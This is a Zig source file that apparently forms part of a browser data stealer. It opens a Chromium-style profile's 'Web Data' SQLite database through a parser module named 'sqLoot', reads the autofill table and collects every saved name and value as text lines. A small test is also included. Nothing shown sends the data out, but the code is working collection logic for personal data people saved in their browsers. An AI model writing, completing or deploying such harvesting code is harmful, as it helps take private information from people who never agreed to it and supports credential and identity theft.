const std = @import("std");
const sqLoot = @import("../parsers/sqLoot.zig");
const file_io = @import("../parsers/file_io.zig");

fn columnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
    const cols = db.getColumnNames(table) catch return null;
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
    }
    for (cols, 0..) |col, i| {
        if (std.mem.eql(u8, col, name)) return i;
    }
    return null;
}

pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator) ?[][]const u8 {
    const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Web Data" }) catch return null;
    defer allocator.free(db_path);

    const mapped = file_io.MappedFile.open(db_path) orelse return null;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return null;
    defer db.deinit();

    const rows = db.readTable("autofill") catch return null;
    defer allocator.free(rows);

    const name_idx = columnIndex(&db, "autofill", "name", allocator) orelse return null;
    const value_idx = columnIndex(&db, "autofill", "value", allocator) orelse return null;

    var list = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (list.items) |item| allocator.free(item);
        list.deinit();
    }

    for (rows) |row| {
        if (row.len <= @max(name_idx, value_idx)) continue;

        const name = if (row[name_idx] != .null) row[name_idx].text else "";
        const value = if (row[value_idx] != .null) row[value_idx].text else "";

        const line = std.fmt.allocPrint(allocator, "{s}\t{s}\n", .{ name, value }) catch continue;
        list.append(line) catch continue;
    }

    if (list.items.len == 0) return null;
    return list.toOwnedSlice();
}

test "extractData returns null for missing path" {
    const result = extractData("C:\\__nonexistent__", std.testing.allocator);
    try std.testing.expect(result == null);
}
